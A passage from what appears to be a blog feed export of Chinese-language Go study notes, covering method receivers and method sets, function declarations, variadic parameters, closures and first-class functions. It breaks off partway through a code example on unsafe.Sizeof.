<code>I</code>。或者说，方法集合这个概念在 Go 语言中的主要用途，就是用来<strong>判断某个类型是否实现了某个接口</strong>。</p><p>有了方法集合的概念做铺垫，选择 receiver 参数类型的第三个原则也相对好理解了。</p><h3 id="原则三"><a href="#原则三" class="headerlink" title="原则三"></a>原则三</h3><p>该原则的选择依据就是 <strong><code>T</code> 类型是否需要实现某个接口</strong>。</p><p>如果 <strong><code>T</code> 类型需要实现某个接口的全部方法，那就要使用 <code>T</code> 作为 receiver 参数的类型，来满足接口类型方法集合中的所有方法</strong>。</p><p>上面这个总结没有问题，只是有一点绕，想表达的意思是，有一个接口类型I，一个自定义非接口类型T，那么下面这段代码是ok的，即t 可以赋值给i。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> Interface <span class="keyword">interface</span> &#123;</span><br><span class="line">    M1()</span><br><span class="line">    M2()</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">type</span> T <span class="keyword">struct</span>&#123;&#125;</span><br><span class="line"><span class="comment">// 使用 T 作为 receiver 参数的类型，来满足接口类型方法集合中的所有方法</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(t T)</span> <span class="title">M1</span><span class="params">()</span></span>  &#123;&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(t T)</span> <span class="title">M2</span><span class="params">()</span></span> &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">  <span class="keyword">var</span> i I </span><br><span class="line">  <span class="keyword">var</span> t T</span><br><span class="line">  i = t    <span class="comment">// 编译成功</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是如果是 *T 实现了I，那么就不能保证 T 也会实现 I，也就是下面这段代码会编译失败。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> Interface <span class="keyword">interface</span> &#123;</span><br><span class="line">    M1()</span><br><span class="line">    M2()</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">type</span> T <span class="keyword">struct</span>&#123;&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(t T)</span> <span class="title">M1</span><span class="params">()</span></span>  &#123;&#125;</span><br><span class="line"><span class="comment">// 使用 *T 作为 receiver 参数的类型</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(t *T)</span> <span class="title">M2</span><span class="params">()</span></span> &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">  <span class="keyword">var</span> i I </span><br><span class="line">  <span class="keyword">var</span> t T</span><br><span class="line">  i = t     <span class="comment">// 编译失败</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因此我们在设计一个自定义类型T的方法时，考虑是否T需要实现某个接口。如果需要，方法receiver参数的类型应该是T。如果T不需要，那么用*T或T就都可以了。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul><li>当 receiver 参数的类型为 <code>T</code> 时，对receiver 参数的任何修改都<strong>不会</strong>影响到原实例</li><li>当 receiver 参数的类型为 <code>*T</code> 时，对receiver 参数的任何修改都<strong>会</strong>影响到原实例</li><li>实际进行 Go 方法设计时，首先应该考虑原则三，其次才是原则一和原则二</li><li>方法集合是用来<strong>判断某一类型是否实现了某接口的唯一手段</strong></li></ul><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://time.geekbang.org/column/intro/100093501" target="_blank" rel="noopener">Tony Bai · Go 语言第一课</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Go </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Go </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Go 语言学习笔记——函数</title>
      <link href="/go-language-study-notes-function/"/>
      <url>/go-language-study-notes-function/</url>
      
        <content type="html"><![CDATA[<p>在 Go 语言中，函数是<strong>唯一一种基于特定输入，实现特定任务并可返回任务执行结果的代码块</strong>，占据着重要的位置。</p><a id="more"></a><h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><p>在 Go 中，定义一个函数最常用的方式就是使用<strong>函数声明</strong>，以Go 标准库 fmt 包提供的 Fprintf 函数为例，看一下一个普通 Go 函数的声明长什么样：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20221105152433.png" alt=""></p><p>可以看到一个函数是由五部分组成，下面一一介绍。</p><h3 id="func-关键字"><a href="#func-关键字" class="headerlink" title="func 关键字"></a>func 关键字</h3><p>Go 函数声明必须以 func 关键字开始。</p><h3 id="函数名"><a href="#函数名" class="headerlink" title="函数名"></a>函数名</h3><p>函数名是指代函数定义的标识符，函数声明后，可以通过函数名这个标识来使用这个函数。</p><p>在同一个 Go 包中，函数名是唯一的，如果重复定义则会编译失败。</p><p>同样的，函数的定义，也遵守 Go 标识符的导出规则，也就是，如果函数名的首字母是大写表示该函数可以在包外使用，反之，小写的就只在包内使用。</p><h3 id="参数列表"><a href="#参数列表" class="headerlink" title="参数列表"></a>参数列表</h3><p>参数列表中声明了将要在函数体中使用的各个参数。</p><p>在其他编程语言中，函数参数通常是允许定义默认值的，但是在 Go 语言中，函数参数不支持默认值。</p><p>参数名在前，参数类型在后，这和变量声明中变量名与类型的排列方式是一致的。</p><p>另外，Go 函数也是支持变长参数，后面详细介绍。</p><h3 id="返回值列表"><a href="#返回值列表" class="headerlink" title="返回值列表"></a>返回值列表</h3><p>返回值承载了函数执行后要返回给调用者的结果。</p><p>如果不仅声明了返回值的类型，还声明了返回值的名称，那么这种返回值被称为<strong>具名返回值</strong>。</p><h3 id="函数体"><a href="#函数体" class="headerlink" title="函数体"></a>函数体</h3><p>函数体是函数的具体实现。</p><p>函数体内并不是一定需要有内容，也就是说，定义一个这样的函数也是合法的：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">foo</span><span class="params">(arr [5]<span class="keyword">int</span>)</span></span> &#123;&#125;</span><br></pre></td></tr></table></figure><p>函数声明中的 <strong>func 关键字、参数列表和返回值列表共同构成了函数类型</strong>。<br>而<strong>参数列表与返回值列表的组合也被称为函数签名</strong>，它是决定两个函数类型是否相同的决定因素。</p><p>如果两个函数类型的函数签名是相同的，即便参数列表中的参数名，以及返回值列表中的返回值变量名都是不同的，那么这两个函数类型也是相同类型，比如下面两个函数类型：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(a <span class="keyword">int</span>, b <span class="keyword">string</span>)</span> <span class="params">(results []<span class="keyword">string</span>, err error)</span></span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c <span class="keyword">int</span>, d <span class="keyword">string</span>)</span> <span class="params">(sl []<span class="keyword">string</span>, err error)</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 将两个函数类型的参数名与返回值变量名省略</span></span><br><span class="line"><span class="comment">// func (int, string) ([]string, error)</span></span><br><span class="line"><span class="comment">// 所以它们是相同的函数类型</span></span><br></pre></td></tr></table></figure><p><strong>每个函数声明所定义的函数，仅仅是对应的函数类型的一个实例</strong>，就像 <code>var a int = 13</code> 这个变量声明语句中 a 是 int 类型的一个实例一样。</p><p>在前面的笔记中，使用复合类型字面值对结构体类型变量进行显式初始化的内容，在形式上，和上面这种使用变量声明来声明函数变量的形式很像。</p><p>把这两种形式都以最简化的样子表现出来：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">s := T&#123;&#125;      <span class="comment">// 使用复合类型字面值对结构体类型T的变量进行显式初始化</span></span><br><span class="line">f := <span class="function"><span class="keyword">func</span><span class="params">()</span></span>&#123;&#125; <span class="comment">// 使用变量声明形式的函数声明</span></span><br></pre></td></tr></table></figure><p>这里，<code>T{}</code>被称为<strong>复合类型字面值</strong>，处于同样位置的 <code>func(){}</code> 叫“函数字面值（Function Literal）”。</p><p>可以看到，函数字面值由函数类型与函数体组成，它特别像一个没有函数名的函数声明，因此也叫它匿名函数。匿名函数在 Go 中用途很广，稍后我们会细讲。</p><h2 id="Go-函数与函数声明"><a href="#Go-函数与函数声明" class="headerlink" title="Go 函数与函数声明"></a>Go 函数与函数声明</h2><h3 id="参数列表-1"><a href="#参数列表-1" class="headerlink" title="参数列表"></a>参数列表</h3><p>Go 语言中，函数参数传递采用是值传递的方式，所谓“值传递”，就是将实际参数在内存中的表示<strong>逐位拷贝</strong>（Bitwise Copy）到形式参数中。</p><p>对于像整型、数组、结构体这类类型，它们的内存表示就是它们自身的数据内容，因此当这些类型作为实参类型时，值传递拷贝的就是它们自身，传递的开销也与它们自身的大小成正比。</p><p>但是像 string、切片、map 这些属于引用类型，它们的内存表示对应的是它们数据内容的“描述符”。当这些类型作为实参类型时，值传递拷贝的仅仅是数据内容的“描述符”，不包括数据内容本身，因此这些类型传递的开销是固定的，与数据内容大小无关，这种方式被成为<strong>浅拷贝</strong>。</p><p>不过函数参数的传递也有两个例外，当函数的形参为接口类型，或者形参是变长参数时，简单的值传递就不能满足要求了。</p><p>对于类型为<strong>接口类型的形参，Go 编译器会把传递的实参赋值给对应的接口类型形参</strong>；对于为<strong>变长参数的形参，Go 编译器会将零个或多个实参按一<br>定形式转换为对应的变长形参</strong>。</p><p>下面通过一段示例代码来说明变长参数的形参：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">myAppend</span><span class="params">(sl []<span class="keyword">int</span>, elems ...<span class="keyword">int</span>)</span> []<span class="title">int</span></span> &#123;</span><br><span class="line">    fmt.Printf(<span class="string">"%T\n"</span>, elems) <span class="comment">// []int</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(elems) == <span class="number">0</span> &#123;</span><br><span class="line">        <span class="built_in">println</span>(<span class="string">"no elems to append"</span>)</span><br><span class="line">        <span class="keyword">return</span> sl</span><br><span class="line">    &#125;</span><br><span class="line">    sl = <span class="built_in">append</span>(sl, elems...)</span><br><span class="line">    <span class="keyword">return</span> sl</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    sl := []<span class="keyword">int</span>&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>&#125;</span><br><span class="line">    sl = myAppend(sl) <span class="comment">// no elems to append</span></span><br><span class="line">    fmt.Println(sl) <span class="comment">// [1 2 3]</span></span><br><span class="line">    <span class="comment">// 调用 myAppend 函数，传递实参 4，5，6</span></span><br><span class="line">    sl = myAppend(sl, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>)</span><br><span class="line">    fmt.Println(sl) <span class="comment">// [1 2 3 4 5 6]</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>重点看一下代码中的 myAppend 函数，在 append 函数的基础上进行了扩展，支持变长参数。</p><p>通过打印变长参数的类型，可以看到类型是 <code>[]int</code>，足以说明<strong>变长参数实际上是通过切片来实现的</strong>。</p><h3 id="返回值"><a href="#返回值" class="headerlink" title="返回值"></a>返回值</h3><p>和其他主流静态类型语言，Go 函数<strong>支持多返回值</strong>，多返回值可以让函数将更多结果信息返回给它的调用者。</p><p>函数返回值列表从形式上看主要有三种：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">foo</span><span class="params">()</span>                       // 无返回值</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">foo</span><span class="params">()</span> <span class="title">error</span>                 // 仅有一个返回值</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">foo</span><span class="params">()</span> <span class="params">(<span class="keyword">int</span>, <span class="keyword">string</span>, error)</span>  // 有2或2个以上返回值</span></span><br></pre></td></tr></table></figure><p>前面提到过，如果一个返回值既有类型，也有名称，那么这类返回值就被成为<strong>具名返回值</strong>。</p><p><strong>Go 标准库以及大多数项目代码中的函数，都选择了使用普通的非具名返回值形式。</strong></p><p>所以多数情况下，只需声明返回值的类型即可，无需使用具名返回值形式。</p><h2 id="一等公民"><a href="#一等公民" class="headerlink" title="一等公民"></a>一等公民</h2><p>函数作为“一等公民”，在 Go 语言中，占据着重要的地位。要知道，并不是在所有编程语言中函数都是“一等公民”。</p><p>那么，什么是编程语言的“一等公民”呢？</p><blockquote><p>如果一门编程语言对某种语言元素的创建和使用没有限制，我们可以像对待值（value）一样对待这种语法元素，那么我们就称这种语法元素是这门编程语言的“一等公民”。拥有“一等公民”待遇的语法元素可以存储在变量中，可以作为参数传递给函数，可以在函数内部创建并可以作为返回值从函数返回。——wikipedia</p></blockquote><p>基于这个解释，我们来看看 Go 语言的函数作为“一等公民”，表现出的各种行为特征。</p><h3 id="函数可以存储在变量中"><a href="#函数可以存储在变量中" class="headerlink" title="函数可以存储在变量中"></a>函数可以存储在变量中</h3><p>关于这一点，其实前面已经验证过了，下面用一个例子再一次理解一下：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> (</span><br><span class="line">    myFprintf = <span class="function"><span class="keyword">func</span><span class="params">(w io.Writer, format <span class="keyword">string</span>, a ...<span class="keyword">interface</span>&#123;&#125;)</span> <span class="params">(<span class="keyword">int</span>, error)</span></span> &#123;</span><br><span class="line">        <span class="keyword">return</span> fmt.Fprintf(w, format, a...)</span><br><span class="line">    &#125;</span><br><span class="line">)</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    fmt.Printf(<span class="string">"%T\n"</span>, myFprintf)              <span class="comment">// myFprintft 的类型 func(io.Writer, string, ...interface &#123;&#125;) (int, error)</span></span><br><span class="line">    myFprintf(os.Stdout, <span class="string">"%s\n"</span>, <span class="string">"Hello, Go"</span>)  <span class="comment">// 调用 myFprintft 输出Hello，Go</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这个例子中，创建一个匿名函数赋值给 myFprintf 变量，通过打印变量类型和调用函数，可以看到预期结果是一致的。</p><h3 id="将函数作为返回值返回"><a href="#将函数作为返回值返回" class="headerlink" title="将函数作为返回值返回"></a>将函数作为返回值返回</h3><p>Go 函数不仅可以在函数外创建，还可以在函数内创建。而且由于函数可以存储在变量中，所以函数也可以在创建后，作为函数返回值返回：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 注意返回值的类型是 函数类型</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">setup</span><span class="params">(task <span class="keyword">string</span>)</span> <span class="title">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="built_in">println</span>(<span class="string">"do some setup stuff for"</span>, task)</span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">        <span class="built_in">println</span>(<span class="string">"do some teardown stuff for"</span>, task)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="comment">// 创建一个变量接受返回值</span></span><br><span class="line">    teardown := setup(<span class="string">"demo"</span>)</span><br><span class="line">    <span class="keyword">defer</span> teardown()</span><br><span class="line">    <span class="built_in">println</span>(<span class="string">"do some bussiness stuff"</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// do some setup stuff for demo</span></span><br><span class="line"><span class="comment">// do some bussiness stuff</span></span><br><span class="line"><span class="comment">// do some teardown stuff for demo</span></span><br></pre></td></tr></table></figure><p>和前面看到的匿名函数不同的是，这个匿名函数使用了定义它的函数 setup 的局部变量 task，这样的匿名函数在 Go 中也被称为<strong>闭包（Closure）</strong>。</p><p>闭包的本质就是匿名函数，不过可以引用它的包裹函数，也就是创建它们的函数中定义的变量，这些变量在包裹函数和匿名函数之间共享，只要闭包可以被访问，这些共享的变量就会继续存在。</p><h3 id="作为参数传入函数"><a href="#作为参数传入函数" class="headerlink" title="作为参数传入函数"></a>作为参数传入函数</h3><p>函数除了可以存储在变量中、作为返回值返回、还可以作为参数传入。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">time.AfterFunc(time.Second*<span class="number">2</span>, <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123; <span class="built_in">println</span>(<span class="string">"timer fired"</span>) &#125;)</span><br></pre></td></tr></table></figure><h3 id="拥有自己的类型"><a href="#拥有自己的类型" class="headerlink" title="拥有自己的类型"></a>拥有自己的类型</h3><p>作为一等公民的整型值拥有自己的类型 int，同样的，作为一等公民的函数，也拥有自己的类型，也就是前面提到的函数类型（由 func 关键字、参数列表和返回值列表共同构成）。</p><p>可以基于函数类型来自定义类型，就像基于整型、字符串类型等类型来自定义类型一样。下面代码中的 HandlerFunc、visitFunc 就是 Go 标准库中，基于函数类型进行自定义的类型：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// $GOROOT/src/net/http/server.go</span></span><br><span class="line"><span class="comment">// 函数类型是 func(ResponseWriter, *Request)</span></span><br><span class="line"><span class="keyword">type</span> HandlerFunc <span class="function"><span class="keyword">func</span><span class="params">(ResponseWriter, *Request)</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// $GOROOT/src/sort/genzfunc.go</span></span><br><span class="line"><span class="comment">// 函数类型是 func(ast.Node) ast.Visitor</span></span><br><span class="line"><span class="keyword">type</span> visitFunc <span class="function"><span class="keyword">func</span><span class="params">(ast.Node)</span> <span class="title">ast</span>.<span class="title">Visitor</span></span></span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul><li>函数支持多返回值</li><li>函数参数不运行定义默认值</li><li>对于像整型、数组、结构体这类类型是值传递，对于string、切片、map 这些类型则是引用传递</li><li>函数类型由 func 关键字 + 参数列表 + 返回值列表组成; 函数签名由参数列表 + 返回值列表组成; 如果两个函数签名相同，则函数类型相同</li><li>Go 语言的函数是一等公民，具备一切作为“一等公民”的行为特征</li></ul>]]></content>
      
      
      <categories>
          
          <category> Go </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Go </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Go 语言学习笔记——unsafe.Sizeof</title>
      <link href="/go-language-study-notes-unsafe-Sizeof/"/>
      <url>/go-language-study-notes-unsafe-Sizeof/</url>
      
        <content type="html"><![CDATA[<p>在 Go 语言中，<code>len</code> 函数可以用于获取一个变量的长度，<code>unsafe.Sizeof</code> 函数用于获取一个数组变量的总大小。</p><a id="more"></a><p><code>len</code> 函数比较简单好理解，使用过程中基本上不会遇到问题，这篇笔记主要介绍 <code>unsafe.Sizeof</code>。</p><h2 id="一个问题"><a href="#一个问题" class="headerlink" title="一个问题"></a>一个问题</h2><p>先来看看这段示例代码：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">"fmt"</span></span><br><span class="line"><span class="string">"unsafe"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> run <span class="keyword">interface</span> &#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Person <span class="keyword">struct</span> &#123;</span><br><span class="line">Name   <span class="keyword">string</span></span><br><span class="line">Age    <span class="keyword">int</span></span><br><span class="line">Gender <span class="keyword">int</span></span><br><span class="line"><span class="comment">//Height int</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Empty <span class="keyword">struct</span> &#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">structFunc</span><span class="params">()</span></span> &#123;</span><br><span class="line">person1 := Person&#123;</span><br><span class="line">Name:   <span class="string">"yumi"</span>,</span><br><span class="line">Age:    <span class="number">23</span>,</span><br><span class="line">Gender: <span class="number">0</span>,</span><br><span class="line"><span class="comment">//Height: 165,</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 结构体占用内存大小取决于组成结构体的字段大小之和，因为空结构体没有字段，所以总大小是零。</span></span><br><span class="line">empty := Empty&#123;&#125;</span><br><span class="line">fmt.Println(<span class="string">"空结构体的总大小是："</span>, unsafe.Sizeof(empty)) <span class="comment">// 0</span></span><br><span class="line"></span><br><span class="line">fmt.Println(<span class="string">"初始化结构体的总大小是："</span>, unsafe.Sizeof(person1)) <span class="comment">// 32</span></span><br><span class="line"></span><br><span class="line">person2 := Person&#123;&#125;</span><br><span class="line">fmt.Println(<span class="string">"零值初始化的结构体的总大小是："</span>, unsafe.Sizeof(person2)) <span class="comment">// 32</span></span><br><span class="line">fmt.Println(<span class="string">"------------------------"</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">interfaceFunc</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">var</span> interface1 <span class="keyword">interface</span>&#123;&#125;</span><br><span class="line">fmt.Println(<span class="string">"空接口的总大小是："</span>, unsafe.Sizeof(interface1)) <span class="comment">// 16</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> interface2 run</span><br><span class="line">fmt.Println(<span class="string">"接口的总大小是："</span>, unsafe.Sizeof(interface2)) <span class="comment">// 16</span></span><br><span class="line">fmt.Println(<span class="string">"------------------------"</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">pointerFunc</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">var</span> ep <span class="keyword">int</span></span><br><span class="line"></span><br><span class="line">i := <span class="string">"123"</span></span><br><span class="line">ip := &amp;i</span><br><span class="line"></span><br><span class="line">s := <span class="string">"hello"</span></span><br><span class="line">sp := &amp;s</span><br><span class="line"></span><br><span class="line">fmt.Println(<span class="string">"空指针的总大小是："</span>, unsafe.Sizeof(ep))       <span class="comment">// 8</span></span><br><span class="line">fmt.Println(<span class="string">"整型指针的总大小是："</span>, unsafe.Sizeof(ip))      <span class="comment">// 8</span></span><br><span class="line">fmt.Println(<span class="string">"string 指针的总大小是："</span>, unsafe.Sizeof(sp)) <span class="comment">// 8</span></span><br><span class="line">fmt.Println(<span class="string">"------------------------"</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">arrayFunc</span><span class="params">()</span></span> &#123;</span><br><span class="line">nums := [...]<span class="keyword">int</span>&#123;<span class="number">1</span>: <span class="number">2</span>, <span class="number">3</span>: <span class="number">4</span>&#125;</span><br><span class="line">fmt.Println(<span class="string">"数组的长度："</span>, <span class="built_in">len</span>(nums)) <span class="comment">// 4</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _, v := <span class="keyword">range</span> nums &#123;</span><br><span class="line"><span class="built_in">println</span>(<span class="string">"v = "</span>, v) <span class="comment">// [0, 2, 0, 4]</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fmt.Println(<span class="string">"数组的总大小是："</span>, unsafe.Sizeof(nums)) <span class="comment">// 32</span></span><br><span class="line">fmt.Println(<span class="string">"------------------------"</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">stringFunc</span><span class="params">()</span></span> &#123;</span><br><span class="line">str := <span class="string">"这句话共七个字"</span></span><br><span class="line">fmt.Println(<span class="string">"string 的长度："</span>, <span class="built_in">len</span>(str)) <span class="comment">// 3 * 7 = 21</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _, v := <span class="keyword">range</span> str &#123;</span><br><span class="line">fmt.Printf(<span class="string">"v = %c \n"</span>, v)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fmt.Println(<span class="string">"string 的总大小是："</span>, unsafe.Sizeof(str)) <span class="comment">// 16</span></span><br><span class="line">fmt.Println(<span class="string">"------------------------"</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">sliceFunc</span><span class="params">()</span></span> &#123;</span><br><span class="line">nums := []<span 